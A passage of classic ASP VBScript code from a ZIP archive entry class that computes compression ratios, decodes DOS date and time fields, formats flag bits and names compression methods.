Ratio = FormatNumber(((1 - (CompressedSize / UncompressedSize)) * 100), 0, True, False, True) & "%"
End If
End Property

Public Property Get Modified()
Modified = CDate(GetDate(LastModifiedDate) & " " & GetTime(LastModifiedTime))
End Property

Private Function GetDate(plngDate)
GetDate = DateSerial(1980 + (plngDate And &HFE00) \ &H200, _
(plngDate And &H1E0) \ &H20, plngDate And &H1F)
End Function

Private Function GetTime(plngDate)
GetTime = TimeSerial((plngDate And &HF800) \ &H800, _
(plngDate And &H7E0) \ &H20, _
(plngDate And &H1F) * 2)
End Function

Public Property Get Size()
Size = UncompressedSize
End Property

Public Property Get BitMask()
Dim llngNumber
Dim lstrBits
llngNumber = GeneralPurposeFlags
Do
If llngNumber Mod 2 = 1 Then lstrBits = "1" & lstrBits Else lstrBits = "0" & lstrBits
llngNumber = llngNumber \ 2
Loop Until llngNumber = 0
lstrBits = Right("0000000000000000" & lstrBits, 16)
For llngNumber = 0 To 3
lstrReturn = lstrReturn & Mid(lstrBits, (llngNumber * 4) + 1, 4) & "."
Next
BitMask = Left(lstrReturn, 19)
End Property

Property Get CompressionMethodString()
Select Case CompressionMethod
Case 0 CompressionMethodString = "The file is stored (no compression)"
Case 1 CompressionMethodString = "The file is Shrunk"
Case 2 CompressionMethodString = "The file is Reduced with compression factor 1"
Case 3 CompressionMethodString = "The file is Reduced with compression factor 2"
Case 4 CompressionMethodString = "The file is Reduced with compression factor 3"
Case 5 CompressionMethodString = "The file is Reduced with compression factor 4"
Case 6 CompressionMethodString = "The file is Imploded"
Case 7 CompressionMethodString = "Reserved for Tokenizing compression algorithm"
Case 8 CompressionMethodString = "The file is Deflated"
Case 9 CompressionMethodString = "Reserved for enhanced Deflating"
Case 10 CompressionMethodString = "PKWARE Date Compression Library Imploding"
Case Else CompressionMethodString = "Unhandled Copression type: " & CompressionMethod
End Select
End Property
End Class
%>